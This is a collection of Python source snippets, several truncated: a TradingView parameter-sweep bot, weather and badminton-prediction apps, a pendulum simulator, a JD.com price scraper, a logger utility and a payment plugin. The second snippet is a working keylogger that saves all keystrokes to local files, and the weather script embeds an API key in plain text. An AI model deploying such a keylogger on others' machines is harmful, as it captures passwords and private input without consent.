    "#SiliconValley\r\n#CryptoBro\r\n#Hacker\r\n\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.firefox.service import Service\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support.ui import WebDriverWait\r\nfrom selenium.webdriver.support import expected_conditions as EC\r\nimport time\r\n\r\nservice = Service()\r\ndriver = webdriver.Firefox(service=service)\r\ndriver.get('https://www.tradingview.com/')\r\n\r\n#  ___                   _       \r\n# |_ _|_ __  _ __  _   _| |_ ___ \r\n#  | || '_ \\| '_ \\| | | | __/ __|\r\n#  | || | | | |_) | |_| | |_\\__ \\\r\n# |___|_| |_| .__/ \\__,_|\\__|___/\r\n#           |_|                  \r\n\r\nprint('input settings:')\r\nprint('v0:')\r\nXPATH0 = \" \"\r\nv0min = input(\"v0min: \")\r\nv0max = input('v0max: ')\r\ni = input('v0 increment: ')\r\n\r\nprint('v1:')\r\nXPATH1 = \" \"\r\nv1min = input(\"v1min: \")\r\nv1max = input('v1max: ')\r\ni1 = input('v2 increment: ')\r\n\r\nprint('v2:')\r\nXPATH2 = \" \"\r\nv2min = input(\"v2min: \")\r\nv2max = input('v2max: ')\r\ni2 = input('v2 increment: ')\r\n\r\nprint('v3:')\r\nXPATH3 = \" \"\r\nv3min = input(\"v3min: \")\r\nv3max = input('v3max: ')\r\ni3 = input('v3 increment: ')\r\n\r\nprint('v4:')\r\nXPATH4 = \" \"\r\nv4min = input(\"v4min: \")\r\nv4max = input('v4max: ')\r\ni4 = input('v4 increment: ')\r\n\r\nprint('v5:')\r\nXPATH5 = \" \"\r\nv5min = input(\"v5min: \")\r\nv5max = input('v5max: ')\r\ni5 = input('v5 increment: ')\r\n\r\nprint('v6:')\r\nXPATH6 = \" \"\r\nv6min = input(\"v6min: \")\r\nv6max = input('v6max: ')\r\ni6 = input('v6 increment: ')\r\n\r\nprint('v7:')\r\nXPATH7 = \" \"\r\nv7min = input(\"v7min: \")\r\nv7max = input('v7max: ')\r\ni7 = input('v7 increment:')\r\n\r\nprint('v8:')\r\nXPATH8 = \" \"\r\nv8min = input(\"v8min: \")\r\nv8max = input('v8max: ')\r\ni8 = input('v8 increment: ')\r\n\r\nprint('v9:')\r\nXPATH9 = \" \"\r\nv9min = input(\"v9min: \")\r\nv9max = input('v9max: ')\r\ni9 = input('v9 increment: ')\r\n\r\n\r\n\r\nPFmin = input('Minimum profit factor: ')\r\nSRmin = input('Minimum Sharpe ratio: ')\r\nWmin = input('Minimum win percentage: ')\r\n\r\n#*you need to manualy navigate to the chart*\r\n\r\n#   ____ _                _              _               \r\n#  / ___| |__   __ _ _ __| |_   ___  ___| |_ _   _ _ __  \r\n# | |   | '_ \\ / _` | '__| __| / __|/ _ \\ __| | | | '_ \\ \r\n# | |___| | | | (_| | |  | |_  \\__ \\  __/ |_| |_| | |_) |\r\n#  \\____|_| |_|\\__,_|_|   \\__| |___/\\___|\\__|\\__,_| .__/ \r\n#                                                 |_|    \r\n\r\n#wait for you to navigate to the chart\r\nWebDriverWait(driver, 250).until(\r\n    EC.presence_of_element_located((By.XPATH, \"/html/body/div[2]/div[5]/div[1]/div[1]/div/div[2]/div[1]/div[2]/div/canvas[2]\"))\r\n)\r\n\r\nprint(\"reached chart\")\r\n\r\n#select indicator template\r\nbot = driver.find_element(By.CSS_SELECTOR, \"#header-toolbar-study-templates > button:nth-child(1) > div:nth-child(1)\")\r\nbot.click()\r\n\r\nWebDriverWait(driver, 60).until(\r\n    EC.presence_of_element_located((By.CSS_SELECTOR, \"div.wrap-JeQoCpvi:nth-child(4) > div:nth-child(1)\"))\r\n)\r\n\r\nbot = driver.find_element(By.CSS_SELECTOR, \"div.wrap-JeQoCpvi:nth-child(4) > div:nth-child(1)\")\r\nbot.click()\r\n\r\nprint(\"selected indicator template\")\r\n\r\n#open performance summary\r\nWebDriverWait(driver, 60).until(\r\n    EC.presence_of_element_located((By.XPATH, '//*[@id=\"Performance Summary\"]'))\r\n)\r\n\r\nbot = driver.find_element(By.XPATH, '//*[@id=\"Performance Summary\"]')\r\nbot.click()\r\n\r\nWebDriverWait(driver, 60).until(\r\n    EC.presence_of_element_located((By.CSS_SELECTOR,  \"tr.ka-tr:nth-child(9) > td:nth-child(2) > div:nth-child(1) > div:nth-child(1)\"))\r\n)\r\n#open settings menu\r\nbot = driver.find_element(By.CSS_SELECTOR, 'button.light-button-bYDQcOkp:nth-child(1)')\r\n\r\nprint('setup done')\r\n\r\n#  ____        __ _       _               _____         _   _             \r\n# |  _ \\  ___ / _(_)_ __ (_)_ __   __ _  |_   _|__  ___| |_(_)_ __   __ _ \r\n# | | | |/ _ \\ |_| | '_ \\| | '_ \\ / _` |   | |/ _ \\/ __| __| | '_ \\ / _` |\r\n# | |_| |  __/  _| | | | | | | | | (_| |   | |  __/\\__ \\ |_| | | | | (_| |\r\n# |____/ \\___|_| |_|_| |_|_|_| |_|\\__, |   |_|\\___||___/\\__|_|_| |_|\\__, |\r\n# |  ___|   _ _ __   ___| |_(_) __|___/__  ___                      |___/ \r\n# | |_ | | | | '_ \\ / __| __| |/ _ \\| '_ \\/ __|                           \r\n# |  _|| |_| | | | | (__| |_| | (_) | | | \\__ \\                           \r\n# |_|   \\__,_|_| |_|\\___|\\__|_|\\___/|_| |_|___/                           \r\n\r\n\r\n#cycle through setings\r\ndef cycle_setings(vxmin, vxmax, XPATH0, vxmin1, vxmax1, XPATH1, vxmin2, vxmax2, XPATH2, vxmin3, vxmax3, XPATH3, vxmin4, vxmax4, XPATH4, vxmin5, vxmax5, XPATH5, vxmin6, vxmax6, XPATH6, vxmin7, vxmax7, XPATH7, vxmin8, vxmax8, XPATH8, vxmin9, vxmax9, XPATH9):\r\n  \r\n  #open setings tab\r\n  bot = driver.find_element(By.CSS_SELECTOR, 'button.light-button-bYDQcOkp:nth-child(1)')\r\n  bot.click()\r\n  \r\n  WebDriverWait(driver, 60).until(\r\n      EC.presence_of_element_located((By.XPATH, '//*[@id=\"inputs\"]'))\r\n  )\r\n\r\n  s = vxmin\r\n  while s <= vxmax:\r\n    set = driver.find_element(By.XPATH, XPATH0)\r\n    set.clear()\r\n    set.send_keys(str(s))\r\n    s+=i\r\n    s1 = vxmin1\r\n    \r\n    while s1 <= vxmax1:\r\n      set1 = driver.find_element(By.XPATH, ",
    "\r\nimport tkinter as tk\r\nfrom tkinter import *\r\nfrom pynput import keyboard\r\nimport json\r\n\r\nkeys_used = []\r\nflag = False\r\nkeys = \"\"\r\n\r\ndef generate_text_log(key):\r\n    with open('key_log.txt', \"w+\") as keys:\r\n        keys.write(key)\r\n\r\ndef generate_json_file(keys_used):\r\n    with open('key_log.json', '+wb') as key_log:\r\n        key_list_bytes = json.dumps(keys_used).encode()\r\n        key_log.write(key_list_bytes)\r\n\r\ndef on_press(key):\r\n    global flag, keys_used, keys\r\n    if flag == False:\r\n        keys_used.append(\r\n            {'Pressed': f'{key}'}\r\n        )\r\n        flag = True\r\n\r\n    if flag == True:\r\n        keys_used.append(\r\n            {'Held': f'{key}'}\r\n        )\r\n    generate_json_file(keys_used)\r\n\r\n\r\ndef on_release(key):\r\n    global flag, keys_used, keys\r\n    keys_used.append(\r\n        {'Released': f'{key}'}\r\n    )\r\n\r\n    if flag == True:\r\n        flag = False\r\n    generate_json_file(keys_used)\r\n\r\n    keys = keys + str(key)\r\n    generate_text_log(str(keys))\r\n\r\ndef start_keylogger():\r\n    global listener\r\n    listener = keyboard.Listener(on_press=on_press, on_release=on_release)\r\n    listener.start()\r\n    label.config(text=\"[+] Keylogger is running!\\n[!] Saving the keys in 'keylogger.txt'\")\r\n    start_button.config(state='disabled')\r\n    stop_button.config(state='normal')\r\n\r\ndef stop_keylogger():\r\n    global listener\r\n    listener.stop()\r\n    label.config(text=\"Keylogger stopped.\")\r\n    start_button.config(state='normal')\r\n    stop_button.config(state='disabled')\r\n\r\nroot = Tk()\r\nroot.title(\"Keylogger\")\r\n\r\nlabel = Label(root, text='Click \"Start\" to begin keylogging.')\r\nlabel.config(anchor=CENTER)\r\nlabel.pack()\r\n\r\nstart_button = Button(root, text=\"Start\", command=start_keylogger)\r\nstart_button.pack(side=LEFT)\r\n\r\nstop_button = Button(root, text=\"Stop\", command=stop_keylogger, state='disabled')\r\nstop_button.pack(side=RIGHT)\r\n\r\nroot.geometry(\"250x250\")\r\n\r\nroot.mainloop()\r\n",
    "import requests\nimport json\nimport os\n\ndef weather_info(city, x):\n    url = f\"http://api.weatherapi.com/v1/current.json?key=2f52d9bd7df943bfa5c110209242903&q={city}\"\n    r = requests.get(url)\n    wdic = json.loads(r.text)\n\n    w = wdic[\"current\"][\"temp_c\"]\n    w1 = wdic[\"current\"][\"temp_f\"]\n    w2 = wdic[\"current\"][\"wind_mph\"]\n    w3 = wdic[\"current\"][\"wind_kph\"]\n    w4 = wdic[\"current\"][\"humidity\"]\n    w5 = wdic[\"current\"][\"cloud\"]\n\n    if x == 'r':\n        print(f\"The current weather in {city} is {w} degrees Celsius.\")\n        print(f\"The current weather in {city} is {w1} degrees Fahrenheit.\")\n        print(f\"The current weather in {city} has {w2} mph wind speed.\")\n        print(f\"The current weather in {city} has {w3} kph wind speed.\")\n        print(f\"The current weather in {city} has {w4}% humidity.\")\n        print(f\"The current weather in {city} has {w5}% cloud coverage.\")\n    elif x == 'l':\n        os.system(f\"say 'The current weather in {city} is {w} degrees Celsius.'\")\n        os.system(f\"say 'The current weather in {city} is {w1} degrees Fahrenheit.'\")\n        os.system(f\"say 'The current weather in {city} has {w2} mph wind speed.'\")\n        os.system(f\"say 'The current weather in {city} has {w3} kph wind speed.'\")\n        os.system(f\"say 'The current weather in {city} has {w4}% humidity.'\")\n        os.system(f\"say 'The current weather in {city} has {w5}% cloud coverage.'\")\n    else:\n        print(\"Please enter a valid option ('r' to read or 'l' to listen).\")\n\n# Example usage\ncity= input(\"Enter the name of the city:\\n\")\nx = input(\"Enter 'r' to read the weather information or 'l' to listen:\\n\")\nweather_info(city, x)\n\n",
    "import streamlit as st\nimport joblib\nimport numpy as np\nimport pandas as pd\nimport requests\nimport datetime\nfrom dotenv import load_dotenv\nimport os\n\nload_dotenv()\n# Load your machine learning model\nmodel = joblib.load('my_model_file.pkl')\n\n# Function to make predictions\ndef predict(a):\n    # Perform prediction using the loaded model\n    prediction = model.predict(a)\n    return prediction\n\ndef classify_weather(description, temperature, humidity, wind_speed):\n    # Initialize the dictionary to store the classified weather parameters\n    weather_classification = {\n        'Outlook_Overcast': [0],\n        'Outlook_Rain': [0],\n        'Outlook_Sunny': [0],\n        'Temperature_Cool': [0],\n        'Temperature_Hot': [0],\n        'Temperature_Mild': [0],\n        'Humidity_High': [0],\n        'Humidity_Normal': [0],\n        'Wind_Strong': [0],\n        'Wind_Weak': [0],        \n    }\n    \n    # Classify based on weather description\n    if 'haze' in description.lower():\n        weather_classification['Outlook_Overcast'] = [1]\n    elif 'rain' in description.lower():\n        weather_classification['Outlook_Rain'] = [1]\n    else:\n        weather_classification['Outlook_Sunny'] = [1]\n    \n    # Classify based on temperature\n    if temperature < 290:\n        weather_classification['Temperature_Cool'] = [1]\n    elif temperature > 303:\n        weather_classification['Temperature_Hot'] = [1]\n    else:\n        weather_classification['Temperature_Mild'] = [1]\n    \n    # Classify based on humidity\n    if humidity > 50:\n        weather_classification['Humidity_High'] = [1]\n    else:\n        weather_classification['Humidity_Normal'] = [1]\n    \n    # Classify based on wind speed\n    if wind_speed > 3:\n        weather_classification['Wind_Strong'] = [1]\n    else:\n        weather_classification['Wind_Weak'] = [1]\n    \n    return weather_classification\n\n# Function to get real-time weather data from OpenWeatherMap API\ndef get_weather_data(city):\n    country_code = 'IN'\n    api_key = os.environ.get(\"api_key\")  # Replace with your API key from OpenWeatherMap\n    url = f'http://api.openweathermap.org/data/2.5/weather?q={city},{country_code}&appid={api_key}'\n    response = requests.get(url)\n    if response.status_code == 200:\n        data = response.json()\n        weather_description = data['weather'][0]['description']\n        temperature = data['main']['temp']\n        humidity = data['main']['humidity']\n        wind_speed = data['wind']['speed']\n        return weather_description, temperature, humidity, wind_speed\n    else:\n        return None, None, None, None\n\n# Streamlit app layout\nst.title('SmashCast')\nst.text('Your Weather-Driven Badminton Outside Play Predictor')\n\nst.image('badmin_img.png', width=200)\n\n# Text input for location for real-time prediction\nlocation = st.selectbox('Enter your city name', ['Mumbai', 'Agra', 'Delhi', 'Bangalore', 'Hyderabad', 'Chennai', 'Kolkata', 'Pune', 'Ahmedabad', 'Jaipur', 'Surat', 'Lucknow', 'Kanpur', 'Nagpur', 'Visakhapatnam', 'Indore', 'Thane', 'Bhopal', 'Patna', 'Vadodara', 'Ghaziabad','Kottayam'])\n# User input fields for custom date and time\ncustom_date = st.date_input('Select a date')\ncustom_time = st.time_input('Select a time')\n# Button for real-time prediction\nif st.button('Real-time Prediction'):\n    # Get real-time weather data\n    weather_desc, temp, hum, wind_spd = get_weather_data(location)\n    if weather_desc is not None:\n        st.write(f\"Today's Weather: {weather_desc}\")\n        st.write(f\"Temperature: {temp} K\")\n        st.write(f\"Humidity: {hum}%\")\n        st.write(f\"Wind Speed: {wind_spd} m/s\")\n        \n        # Classify weather parameters for real-time prediction\n        classification_result = classify_weather(weather_desc, temp, hum, wind_spd)\n        current_weather = pd.DataFrame(classification_result)\n    \n        # Make prediction based on custom weather parameters\n        prediction = predict(current_weather)\n        st.write(f'Real-Time Prediction: {\"Yes, you can play Badminton.\" if prediction[0] == 1 else \"No, you cannot play Badminton.\"}')\n        if prediction[0] == 1:\n            st.balloons()\n\nst.image('badgy.png')\n",
    "\"\"\"\nDouble Pendulum Simulation\n\nThis scripts simulates a double pendulum.\nPhysics-related paramters such as\n- the two masses in the pendulum\n- the two lengths of the two rods in the pendulum\n- the initial angular velocities of the pendulum\n- the gravitational constant\n\nas well as paramters to tweak the simulation (see\nhelp message) can be provided on the command-line.\n\nInteresting parameters are `--display` and `--show-past`.\nThe first one not only generates a picture of the of the\ntrajectory of the bottom mass but also shows the animated\nsimulation while the second adds a trail of all past positions\nof the bottom mass to the simulation.\n\nAn image of the positions visited by the bottom mass can be \nstored using the `--output` flag.\n\"\"\"\nimport argparse as ap\nimport matplotlib as mpl\nimport matplotlib.pyplot as plt\nimport numpy as np\nimport pathlib as pl\n\nfrom matplotlib.animation import FuncAnimation\nfrom matplotlib.colors import LinearSegmentedColormap\n\n# set the plot background color\nplt.rcParams[\"figure.facecolor\"] = '#2e3440'\n\n\ndef parse_args():\n    parser = ap.ArgumentParser(description=__doc__, formatter_class=ap.RawTextHelpFormatter)\n    parser.add_argument('--m1', type=float, default=2, help='The value of the first mass [kg]')\n    parser.add_argument('--m2', type=float, default=1, help='The value of the second mass [kg]')\n    parser.add_argument('--r1', type=float, default=3, help='The length of the first pendulum rod [m]')\n    parser.add_argument('--r2', type=float, default=2.5, help='The length of the second pendulum rod [m]')\n    parser.add_argument('--v1', type=float, default=0, help='The first initial angular velocity [rad / s]')\n    parser.add_argument('--v2', type=float, default=0, help='The second initial angular velocity [rad / s]')\n    parser.add_argument('--i1', type=float, default=0.85 * np.pi, help='The initial value for the first angle')\n    parser.add_argument('--i2', type=float, default=0.75 * np.pi, help='The initial value for the first angle')\n    parser.add_argument('--dt', type=float, default=1e-3, help='The simulation time stamp in seconds')\n    parser.add_argument('-g', '--gravity', type=float, default=9.81, help='The value for the gravitational constant [N * m^2 / kg^2]')\n    parser.add_argument('--steps', '-s', type=int, default=100_000, help='The number of simulation steps')\n    parser.add_argument('--pause', type=float, default=1e-15, help='The pause between different renderings')\n    parser.add_argument('-d', '--display', action='store_true', help='Display the simulation')\n    parser.add_argument('--dpi', type=int, default=350, help='The image resolution in dpi.')\n    parser.add_argument('--marker-size', type=float, default=0.03, help=\"The marker-size.\")\n    parser.add_argument('--mod', '-m', type=int, default=100, help='When the simulation is shown, only display every `mod` step')\n    parser.add_argument('-p', '--show-past', type=int, default=0, help='Specify how many past positions should be shown in the tail')\n    parser.add_argument('--output', '-o', type=pl.Path, required=False, help='The output path of the plot')\n    parser.add_argument('--ot1', type=pl.Path, required=False, help='Output a plot of the theta1 angle over time.')\n    parser.add_argument('--ot2', type=pl.Path, required=False, help='Output a plot of the theta2 angle over time.')\n    parser.add_argument('--delta-t2', type=float, required=False, help='Optional small offset of theta_2. Show how trajectories are sensible to initial conditions.')\n    return parser.parse_args()\n\n\nclass FPrime:\n    \"\"\"Define the system of DEs.\n\n    We express the system of second-order order DEs\n    as a coupled system of first-order DEs of the form\n   \n    x' = f(x)\n\n    This class defines the function f.\n    \"\"\"\n    def __init__(self, m1, m2, r1, r2, g):\n        \"\"\"Pass the parameters of the system\n\n        Arguments\n        ---------\n        m1: float\n            The top mass\n        m2: float\n            The bottom mass\n        r1: float\n            The length of the top rod\n        r2: float\n            The length of the bottom rod\n        g: float\n            The gravitational constant\n        \"\"\"\n        self._m1 = m1\n        self._m2 = m2\n        self._r1 = r1\n        self._r2 = r2\n        self._g = g\n    \n    def __call__(self, w):\n        m1 = self._m1\n        m2 = self._m2\n        r1 = self._r1\n        r2 = self._r2\n        g = self._g\n\n        dt = w[0] - w[1]\n        den = m1 + m2 - m2 * np.cos(dt)**2\n        m12 = m1 + m2\n\n        return np.array([\n                w[2],\n                w[3],\n                (-m2 * r2 * w[3]**2 * np.sin(dt) - g * m12 * np.sin(w[0]) - r1 * m2 * w[2]**2 / 2 * np.sin(2*dt) + g * m2 * np.sin(w[1]) * np.cos(dt)) / (r1 * den),\n                (r1 * m12 * w[2]**2 * np.sin(dt) - g * m12 * np.sin(w[1]) + r2 * m2 * w[3]**2 / 2 * np.sin(2*dt) + g * m12 * np.sin(w[0]) * np.cos(dt)) / (r2 * den),\n                ])\n\n\nclass RungeKutta4:\n    \"\"\"The Runge Kutta solver\"\"\"\n    def __init__(self, dt, f",
    "# -*- encoding=utf8 -*-\n__author__ = \"EDY\"\n\nimport time\nimport pandas as pd\nimport re\nfrom airtest.core.api import *\nfrom poco.drivers.android.uiautomation import AndroidUiautomationPoco\n\n\ndef jd_add_columns_by_sku(big_df, small_df):\n    \"\"\" \u5c06\u722c\u53d6app\u4ef7\u683c\u6570\u636e\u6839\u636eSKU\u6dfb\u52a0\u5230\u603b\u8868 \"\"\"\n    # \u521b\u5efa\u4e00\u4e2a\u5b57\u5178\uff0c\u4ee5 sku \u4f5c\u4e3a\u952e\uff0c\u65b0\u7684\u4e24\u5217\u6570\u636e\u4f5c\u4e3a\u503c\n    small_dict = dict(zip(small_df['SKU'], zip(small_df['\u4ef7\u683c1'], small_df['\u4ef7\u683c2'], small_df['\u4ef7\u683c3'], small_df['\u53d1\u8d27\u5730\u533a'])))\n    # print(small_dict)\n    # big_df = big_df[(big_df['\u5468\u6210\u4ea4\u5355\u91cf'].isnull()) & (big_df['\u6708\u6210\u4ea4\u5355\u91cf'].isnull())]\n    # \u904d\u5386\u5927\u7684DataFrame\u7684\u6bcf\u4e00\u884c\n    for index, row in big_df.iterrows():\n        sku = row['SKU']\n        # print(sku)\n        # \u5982\u679c\u5728\u5c0f\u7684DataFrame\u4e2d\u627e\u5230\u4e86\u76f8\u5e94\u7684 sku\n        # print(list(small_dict.keys()))\n        sku_list = [str(x) for x in list(small_dict.keys())]\n        if str(sku) in sku_list:\n            # \u5c06\u5c0f\u7684DataFrame\u4e2d\u5bf9\u5e94\u7684\u4e24\u4e2a\u5b57\u6bb5\u7684\u6570\u636e\u6dfb\u52a0\u5230\u539f\u59cb\u7684\u5927\u7684DataFrame\u4e2d\n            big_df.at[index, '\u4ef7\u683c1'] = small_dict[f'{sku}'][0]\n            big_df.at[index, '\u4ef7\u683c2'] = small_dict[f'{sku}'][1]\n            big_df.at[index, '\u4ef7\u683c3'] = small_dict[f'{sku}'][2]\n            big_df.at[index, '\u53d1\u8d27\u5730\u533a'] = small_dict[f'{sku}'][3]\n            # print(small_dict[f'{sku}'][0], small_dict[f'{sku}'][1], small_dict[f'{sku}'][2], small_dict[f'{sku}'][3])\n        # else:\n            # \u5982\u679c\u6ca1\u627e\u5230\uff0c\u5219\u586b\u5145\u7a7a\u503c\n            # big_df.at[index, target_time] = None\n            # big_df.at[index, '\u6708\u6210\u4ea4\u5355\u91cf'] = None\n\n    return big_df\n\n\ndef process_app_df(df):\n    \"\"\" \u5904\u7406\u6570\u636e\u683c\u5f0f \"\"\"\n    df['\u4ef7\u683c1'] = df['\u4ef7\u683c1'].apply(\n        lambda x: float(str(x).replace(\"\u00a5\", '').replace('.00', '')) if str(x).replace(\"\u00a5\", '').replace('.00', '').replace('.', '', 1).isdigit() else x)\n    df['\u4ef7\u683c2'] = df['\u4ef7\u683c2'].apply(\n        lambda x: float(str(x).replace(\"\u00a5\", '').replace('.00', '')) // 2 if str(x).replace(\"\u00a5\", '').replace('.00', '').replace('.', '', 1).isdigit() else x)\n    df['\u4ef7\u683c3'] = df['\u4ef7\u683c3'].apply(\n        lambda x: float(str(x).replace(\"\u00a5\", '').replace('.00', '')) // 3 if str(x).replace(\"\u00a5\", '').replace('.00', '').replace('.', '', 1).isdigit() else x)\n\n    columns_to_fill = ['\u5468\u6210\u4ea4\u5355\u91cf', '\u6708\u6210\u4ea4\u5355\u91cf']\n    value_to_fill = '/'  # \u4f60\u60f3\u8981\u66ff\u6362\u7684\u503c\n    df[columns_to_fill] = df[columns_to_fill].fillna(value_to_fill)\n    df.rename(columns={'\u4ef7\u683c2': '\u62cd2\u4ef6\u5e73\u5747\u4ef7', '\u4ef7\u683c3': '\u62cd3\u4ef6\u5e73\u5747\u4ef7'}, inplace=True)\n    # \u8f6c\u6362\u6210\u5217\u8868\u7684\u5f62\u5f0f\n    list_of_lists = df.values.tolist()\n\n    # \u904d\u5386\u5217\u8868\uff0c\u6839\u636e\u9700\u8981\u63d2\u5165\u7a7a\u5b57\u7b26\u4e32\u5217\u8868\n    result = []\n    prev_col2_value = None  # \u7528\u4e8e\u5b58\u50a8\u4e0a\u4e00\u884c\u7684col2\u7684\u503c\n    x = 0\n    for i, item in enumerate(list_of_lists):\n        result.append(item)\n        if prev_col2_value is not None and item[1] != prev_col2_value:\n            result.insert(i + x, [''] * len(df.columns))  # \u5728\u9700\u8981\u7684\u5730\u65b9\u63d2\u5165\u7a7a\u884c\n            x += 1\n        prev_col2_value = item[1]\n\n    # \u5c06\u5217\u8868\u8f6c\u56deDataFrame\n    new_df = pd.DataFrame(result, columns=df.columns)\n    return new_df\n\n\ndef jd_app_main(jd_save_path_dir, table_name):\n    auto_setup(__file__)\n\n    poco = AndroidUiautomationPoco(use_airtest_input=True, screenshot_each_action=False)\n\n    poco(text=\"\u4eac\u4e1c\").click()\n    poco(\"android.widget.FrameLayout\").offspring(\"android:id/content\").offspring(\"com.jingdong.app.mall:id/tf\").offspring(\"com.jingdong.app.mall:id/az_\").offspring(\"\u641c\u7d22\u680f\").child(\"android.widget.ImageView\").wait_for_appearance(timeout=10)\n    poco(\"android.widget.FrameLayout\").offspring(\"android:id/content\").offspring(\"com.jingdong.app.mall:id/tf\").offspring(\"com.jingdong.app.mall:id/az_\").offspring(\"\u641c\u7d22\u680f\").child(\"android.widget.ImageView\").click()\n\n    if os.path.exists(rf\"{jd_save_path_dir}\\\u5bfc\u51fa\u4ef7\u683c\\jd-{table_name}.xlsx\"):\n        df = pd.read_excel(rf\"{jd_save_path_dir}\\\u5bfc\u51fa\u4ef7\u683c\\jd-{table_name}.xlsx\")\n    else:\n        df = pd.read_excel(rf\"{jd_save_path_dir}\\\u67e5\u5b8c\u9500\u91cf\\jd-{table_name}.xlsx\")\n    # store_name_list = df[\"\u5e97\u94fa\"].tolist()\n    sku_list = df[df[\"\u4ef7\u683c1\"].isnull()][\"SKU\"].tolist()\n\n    place_list, price_list1, price_list2, price_list3 = [], [], [], []\n    try:\n        for sku in sku_list:\n            sku = str(sku)\n            poco(nameMatches=\"com.jd.lib.search.feature:id/a_.*\").set_text(f\"{sku}\")\n            poco(text=\"\u641c\u7d22\").click()\n            # \u5f39\u7a97\u5e72\u6270\n            if poco(desc=\"\u5173\u95ed\").exists():\n                poco(desc=\"\u5173\u95ed\").click()\n            # \u5546\u54c1\u65e0\u8d27\u60c5\u51b5\n            if poco(\"\u65e0\u8d27\").exists():\n                print(f'sku:{sku}\u65e0\u8d27')\n                price_list1.append(\"\u65e0\u8d27\")\n                price_list2.append(\"\u65e0\u8d27\")\n                price_list3.append(\"\u65e0\u8d27\")\n                place_list.append(\"\u65e0\u8d27\")\n                # \u8f93\u5165\u6846\u6e05\u9664\u4e0a\u4e00\u4e2asku\n                poco(desc=\"\u5220\u9664\").click()\n                continue\n\n            # \u70b9\u5165\u5546\u54c1\u8be6\u60c5\u9875\\\n            time.sleep(1)\n            # poco(nameMatches=\"com.jd.lib.search.feature:id/a7.*\").wait_for_appearance(timeout=5)\n            if poco(nameMatches=\"com.jd.lib.search.feature:id/a7.*\").exists():\n                poco(nameMatches=\"com.jd.lib.search.feature:id/a7.*\").click()\n                time.sleep(0.5)\n                # \u5230\u8d27\u901a\u77e5\u60c5\u51b5\n                if poco(text=\"\u5230\u8d27\u901a\u77e5\").exists():\n                    price_list1.append('\u65e0\u8d27')\n                    price_list2.append('\u65e0\u8d27')\n                    price_list3.append('\u65e0\u8d27')\n                    place_list.append(\"\u65e0\u8d27",
    "import logging\nimport os\n\n\ndef setup_logger(name, log_file, level=logging.INFO):\n    \"\"\"Function setup as many loggers as you want\"\"\"\n    log_format = (\n        '%(asctime)s - '\n        '%(name)s - '\n        '%(funcName)s - '\n        '%(levelname)s - '\n        '%(message)s'\n    )\n    logger = logging.getLogger(name)\n    logger.setLevel(level)\n    formatter = logging.Formatter(log_format)\n    fh = logging.FileHandler(log_file, mode='w')\n    fh.setFormatter(formatter)\n    sh = logging.StreamHandler()\n    sh.setFormatter(formatter)\n    logger.addHandler(fh)\n    logger.addHandler(sh)\n    return logger\n\ndef create_logger(dataset, model_name,log_name):\n    # if not os.path.exists('./newlogs/{}/'.format(dataset)):\n    #     os.makedirs('./newlogs/{}/'.format(dataset))\n\n    if dataset == 0:\n        assert False\n    elif dataset == \"GD\":\n        file_logger = setup_logger(model_name,'./logs/GD/{}_{}_{}.log'.format(model_name, dataset,log_name))\n    elif dataset == \"HSS\":\n        file_logger = setup_logger(model_name,'./logs/GD/{}_{}_{}.log'.format(model_name, dataset,log_name))\n    elif dataset == \"TD\":\n        file_logger = setup_logger(model_name,'./logs/GD/{}_{}_{}.log'.format(model_name, dataset,log_name))\n    elif \"Yahoo\" in dataset :\n        file_logger = setup_logger(model_name, './logs/GD/{}_{}_{}.log'.format(model_name, dataset,log_name))\n    elif \"ECG\" in dataset :\n        file_logger = setup_logger(model_name, './logs/ECG/{}_{}_{}.log'.format(model_name, dataset,log_name))\n    return file_logger\n\n\ndef display(logger, metrics_result):\n    logger.info('============================')\n    # logger.info('avg_TN = {}'.format(metrics_result.TN))\n    # logger.info('avg_FP = {}'.format(metrics_result.FP))\n    # logger.info('avg_FN = {}'.format(metrics_result.FN))\n    # logger.info('avg_TP = {}'.format(metrics_result.TP))\n    # logger.info('avg_precision = {}'.format(metrics_result.precision))\n    # logger.info('avg_recall = {}'.format(metrics_result.recall))\n    # logger.info('avg_fbeta = {}'.format(metrics_result.fbeta))\n    logger.info('last_roc_auc = {}'.format(metrics_result.roc_auc))\n    logger.info('last_pr_auc = {}'.format(metrics_result.pr_auc))\n    logger.info('last_F1 = {}'.format(metrics_result.F1))\n    logger.info('avg_roc_auc = {}'.format(metrics_result.avg_roc_auc))\n    logger.info('avg_pr_auc = {}'.format(metrics_result.avg_pr_auc))\n    logger.info('avg_F1 = {}'.format(metrics_result.avg_F1))\n    logger.info('best_roc_auc = {}'.format(metrics_result.best_roc_auc))\n    logger.info('best_pr_auc = {}'.format(metrics_result.best_pr_auc))\n    logger.info('best_F1 = {}'.format(metrics_result.best_F1))\n    # logger.info('avg_cks = {}'.format(metrics_result.cks))\n    # logger.info('avg_best_TN = {}'.format(metrics_result.best_TN))\n    # logger.info('avg_best_FP = {}'.format(metrics_result.best_FP))\n    # logger.info('avg_best_FN = {}'.format(metrics_result.best_FN))\n    # logger.info('avg_best_TP = {}'.format(metrics_result.best_TP))\n    # logger.info('avg_best_precision = {}'.format(metrics_result.best_precision))\n    # logger.info('avg_best_recall = {}'.format(metrics_result.best_recall))\n    # logger.info('avg_best_fbeta = {}'.format(metrics_result.best_fbeta))\n    # logger.info('avg_best_roc_auc = {}'.format(metrics_result.best_roc_auc))\n    # logger.info('avg_best_pr_auc = {}'.format(metrics_result.best_pr_auc))\n    # logger.info('avg_best_cks = {}'.format(metrics_result.best_cks))\n    # logger.info('training_time = {}'.format(metrics_result.training_time))\n    # logger.info('testing_time = {}'.format(metrics_result.testing_time))\n    # logger.info('memory_estimation = {}'.format(metrics_result.memory_estimation))\n    logger.info('============================')",
    "import hashlib\nimport json\nimport logging\nimport phonenumbers\nimport requests\nimport uuid\nfrom collections import OrderedDict\nfrom django import forms\nfrom django.conf import settings\nfrom django.core.cache import cache\nfrom django.http import HttpRequest\nfrom django.template.loader import get_template\nfrom django.urls import reverse\nfrom django.utils.safestring import mark_safe\nfrom django.utils.translation import gettext_lazy as _\nfrom phonenumber_field.formfields import PhoneNumberField\nfrom pretix.base.forms import SecretKeySettingsField\nfrom pretix.base.forms.questions import (\n    WrappedPhoneNumberPrefixWidget,\n    guess_phone_prefix_from_request,\n)\nfrom pretix.base.models import Event, OrderPayment, OrderRefund\nfrom pretix.base.payment import BasePaymentProvider, PaymentException\nfrom pretix.base.settings import SettingsSandbox\nfrom pretix.presale.views.cart import cart_session\nfrom urllib.parse import urljoin\n\nfrom .tasks import check_payment\n\nlogger = logging.getLogger(__name__)\nENVIRONMENTS = (\n    (\"sandbox\", 